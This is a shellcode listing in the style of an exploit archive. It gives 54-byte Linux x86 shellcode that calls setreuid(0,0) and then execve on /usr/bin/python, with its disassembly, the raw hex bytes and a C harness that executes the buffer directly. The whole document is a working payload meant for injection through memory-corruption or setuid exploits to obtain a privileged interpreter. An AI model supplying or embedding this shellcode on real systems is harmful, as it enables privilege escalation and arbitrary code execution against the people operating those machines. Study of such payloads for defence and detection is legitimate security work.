/*
# Title: Shellcode Linux x86 [54Bytes] Run /usr/bin/python | setreuid(),execve()
# Date: 8/5/2014
# Author: Ali Razmjoo
# Tested on: kali-linux-1.0.4-i386 [3.7-trunk-686-pae #1 SMP Debian 3.7.2-0+kali8 i686 GNU/Linux ]
*/

/*
Ali Razmjoo , Ali.Razmjoo1994@Gmail.Com
Shellcode Linux x86 Run /usr/bin/python | setreuid(),execve()
Shellcode Length: 54


00000000 <_start>:
   0:   31 c0                   xor    %eax,%eax
   2:   b0 46                   mov    $0x46,%al
   4:   31 db                   xor    %ebx,%ebx
   6:   31 c9                   xor    %ecx,%ecx
   8:   cd 80                   int    $0x80
   a:   eb 16                   jmp    22 <last>
0000000c <first>:
   c:   5b                      pop    %ebx
   d:   31 c0                   xor    %eax,%eax
   f:   88 43 0f                mov    %al,0xf(%ebx)
  12:   89 5b 10                mov    %ebx,0x10(%ebx)
  15:   89 43 14                mov    %eax,0x14(%ebx)
  18:   b0 0b                   mov    $0xb,%al
  1a:   8d 4b 10                lea    0x10(%ebx),%ecx
  1d:   8d 53 14                lea    0x14(%ebx),%edx
  20:   cd 80                   int    $0x80
00000022 <last>:
  22:   e8 e5 ff ff ff          call   c <first>
  27:   2f                      das
  28:   75 73                   jne    9d <last+0x7b>
  2a:   72 2f                   jb     5b <last+0x39>
  2c:   62 69 6e                bound  %ebp,0x6e(%ecx)
  2f:   2f                      das
  30:   70 79                   jo     ab <last+0x89>
  32:   74 68                   je     9c <last+0x7a>
  34:   6f                      outsl  %ds:(%esi),(%dx)
  35:   6e                      outsb  %ds:(%esi),(%dx)
*/

#include <stdio.h>
#include <string.h>

char sc[] = "\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x0f\x89\x5b\x10\x89\x43\x14\xb0\x0b\x8d\x4b\x10\x8d\x53\x14\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x75\x73\x72\x2f\x62\x69\x6e\x2f\x70\x79\x74\x68\x6f\x6e";

int main(void)
{
    fprintf(stdout,"Length: %d\n\n",strlen(sc));
    (*(void(*)()) sc)();
}